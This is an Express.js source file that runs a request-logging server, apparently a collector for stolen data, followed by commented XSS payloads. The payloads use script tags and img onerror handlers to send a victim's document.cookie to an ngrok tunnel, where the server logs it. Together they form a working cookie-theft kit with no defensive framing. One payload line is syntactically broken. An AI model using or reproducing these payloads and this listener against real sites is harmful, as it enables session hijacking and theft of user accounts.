const express = require("express");
const app = express();
const port = 3000;

app.use((req, res, next) => {
  console.log(`URL demandée : ${req.method} ${req.url}`);
  next();
});

app.get("/", (req, res) => {
  console.log("GET reçu:", req.query);
  res.send("OK");
});

app.post("/", (req, res) => {
  console.log("POST reçu:", req.body);
  res.send("OK");
});

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`);
});


// <script>fetch(`https://9caa34b6accd.ngrok-free.app/?cookie=${encodeURIComponent(document.cookie)}`);</script>
// <script>fetch(`https://9caa34b6accd.ngrok-free.app` + document.cookie()</script>
// <script>console.log("XSS");fetch("https://9caa34b6accd.ngrok-free.app/?cookie=" + encodeURIComponent(document.cookie));</script>
// <img src=x onerror="fetch('https://9caa34b6accd.ngrok-free.app/?cookie=' + encodeURIComponent(document.cookie))">
// <img src=x onerror="console.log('XSS déclenché'); fetch('https://9caa34b6accd.ngrok-free.app/?cookie=' + encodeURIComponent(document.cookie))">


